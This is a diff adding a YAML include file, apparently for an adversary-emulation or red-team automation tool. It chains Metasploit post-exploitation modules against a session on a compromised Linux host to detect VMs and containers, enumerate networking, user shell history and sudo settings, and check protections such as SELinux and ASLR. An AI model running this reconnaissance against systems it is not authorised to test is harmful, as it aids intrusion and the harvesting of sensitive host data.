@@ -1,0 +1,49 @@
+#
+# Include: gather_commands.yml
+#
+# Description:
+#     Runs a standard set of Metasploit post modules to gather information
+#     from a compromised Linux target. These modules collect network config,
+#     user history, VM detection results, and security protection status.
+#
+# Required variables (must be set by the calling playbook before include):
+#   $GATHER_SESSION  - the numeric Metasploit session ID ($LAST_MSF_SESSION)
+#
+# Example usage in a calling playbook:
+#   - type: setvar
+#     variable: GATHER_SESSION
+#     cmd: $LAST_MSF_SESSION
+#   - type: include
+#     local_path: ./includes/gather_commands.yml
+#
+
+commands:
+  # Check if the target is running in a virtual machine
+  - type: msf-module
+    cmd: post/linux/gather/checkvm
+    options:
+      SESSION: $GATHER_SESSION
+
+  # Check if the target is running in a container
+  - type: msf-module
+    cmd: post/linux/gather/checkcontainer
+    options:
+      SESSION: $GATHER_SESSION
+
+  # Enumerate network interfaces, routing, and firewall rules
+  - type: msf-module
+    cmd: post/linux/gather/enum_network
+    options:
+      SESSION: $GATHER_SESSION
+
+  # Gather user accounts, shell history, and sudo configuration
+  - type: msf-module
+    cmd: post/linux/gather/enum_users_history
+    options:
+      SESSION: $GATHER_SESSION
+
+  # Check for security protections (SELinux, AppArmor, ASLR, etc.)
+  - type: msf-module
+    cmd: post/linux/gather/enum_protections
+    options:
+      SESSION: $GATHER_SESSION
